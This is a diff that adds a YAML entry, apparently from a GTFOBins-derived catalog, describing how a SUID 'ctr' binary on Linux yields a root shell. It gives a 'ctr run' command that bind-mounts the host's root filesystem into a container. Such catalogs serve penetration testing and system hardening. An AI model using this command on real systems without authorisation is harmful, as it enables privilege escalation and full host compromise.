@@ -1,0 +1,33 @@
+id: gtfobins/ctr/shell/suid
+type: binary
+platform: linux
+name: ctr
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest
+    x
+  comment: 'An image must be already present, for example:
+
+
+    ```
+
+    ctr images pull docker.io/library/alpine:latest
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/ctr/
+tags:
+- linux
+- unix
+- gtfobins
